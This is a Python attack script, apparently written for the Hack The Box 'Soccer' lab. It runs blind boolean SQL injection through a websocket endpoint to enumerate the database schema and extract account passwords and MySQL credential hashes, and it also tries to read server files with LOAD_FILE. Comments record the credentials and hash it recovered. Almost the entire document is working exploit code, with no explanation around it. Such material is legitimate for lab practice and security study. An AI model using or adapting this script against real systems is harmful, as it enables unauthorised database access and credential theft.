import asyncio
import websockets

RHOST = 'ws://soc-player.soccer.htb:9091'
CHARSET = 'pPabcdefghijklmnopqrstuvwxyz1234567890_-@.~!@#$%^&*()+=<>:;?/|\`ABCDEFGHIJKLMNOPQRSTUVWXYZ'

async def test_query(query):
    async with websockets.connect(RHOST) as websocket:
        await websocket.send('{"id": "' + query + '"}')
        res = await websocket.recv() == 'Ticket Exists'
        print(query, res)
        return res

async def brute_database_name(out=''):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR(DATABASE(),1," + str(len(out)+1) + ")) = '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_database_name(out)

    print('[+] Database name: ' + out)
    return out

async def brute_databases(out='', row=0):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR(table_schema," + str(len(out)+1) + ",1) FROM information_schema.tables GROUP BY table_schema LIMIT "+str(row)+",1;) = '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_database_name(out)

    if out != '':
        print('[+] Database name: ' + out)
        return await brute_databases('', row+1)

    return out

async def brute_num_tables(database):
    for i in range(1,100):
        if await test_query("1 OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND table_schema = '" + database + "') = " + str(i)):
            print('[+] Number of tables: ' + str(i))
            return i

async def brute_table_name(database, out=''):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR(table_name,1," + str(len(out)+1) + ") FROM information_schema.tables WHERE table_schema = '" + database + "' LIMIT 1) = '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_table_name(database, out)

    print('[+] Table name: ' + out)
    return out

async def brute_num_cols(database, table):
    for i in range(1,100):
        if await test_query("1 OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '" + database + "' AND table_name = '" + table + "') = " + str(i)):
            print('[+] Number of tables: ' + str(i))
            return i

async def brute_col_names(database, table, col, out = ''):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR(column_name,1," + str(len(out)+1) + ") FROM INFORMATION_SCHEMA.columns WHERE table_name = '" + table + "' AND table_schema = '" + database + "' LIMIT "+ str(col) +",1) = '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_col_names(database, table, col, out)

    print('[+] Table name: ' + out)
    return out

async def brute_num_records(table):
    for i in range(0,100):
        if await test_query("1 OR (SELECT COUNT(*) FROM " + table + ") = " + str(i)):
            print('[+] Number of records: ' + str(i))
            return i

async def brute_col_value(table, col, where='1=1', out='',row=0):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR("+col+",1," + str(len(out)+1) + ") FROM " + table + " AND "+where+" LIMIT "+str(row)+",1) = BINARY '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_col_value(table, col, where, out, row)

    if out != '':
        print('[+] Col value: ' + out)
        return await brute_col_value(table, col, where, '', row+1)

    return out

async def brute_variable(var, out=''):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR("+var+",1," + str(len(out)+1) + ")) = '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_variable(var, out)

    return out

async def brute_file(file, out=''):
    for char in CHARSET:
        if await test_query("1 OR (SELECT SUBSTR(*,1," + str(len(out)+1) + ") FROM LOAD_FILE('" + file + "')) = '" + out + char + "'"):
            out += char
            print('[+] Char found. Current: ' + out)
            return await brute_file(file, out)

    return out

# asyncio.run(brute_database_name())
database = 'soccer_db'
# asyncio.run(brute_databases(row=0))

# await asyncio.run(brute_num_tables(database))
num_tables = 1

# asyncio.run(brute_table_name(database))
table = 'accounts'

# asyncio.run(brute_num_cols(database, table))
num_cols = 4

# for col in range(1,num_cols+1):
#     asyncio.run(brute_col_names(database, table, col))
cols = ['id', 'password', 'username', 'email']

# asyncio.run(brute_num_records(table))
num_records = 1

# for col in cols:
#     asyncio.run(brute_col_value(table, col, out='playerofthematch'))
asyncio.run(brute_col_value(table, 'password', out=''))
# (1234, 'PlayerOftheMatch2022', 'player', 'player@player.htb')

# asyncio.run(brute_col_value('mysql.user', 'User', out='', row=0))
# ['debian-sys-maint', 'mysql.infoschema', 'mysql.session', 'mysql.sys', 'player', 'root']

# asyncio.run(brute_col_value('mysql.user', 'authentication_string', where="User = 'player'", out='', row=0))
# '*9C66A903EC673FCF95D84CE93691AD526969AA3C'

# asyncio.run(brute_col_value('information_schema.processlist', 'User', where="1=1 GROUP BY User", out='', row=0))
# ['player']

# asyncio.run(brute_variable('@@secure_file_priv', out='/var/lib/mysq'))
# '/var/lib/mysql-files'

# asyncio.run(brute_file('/home/player/player.txt'))
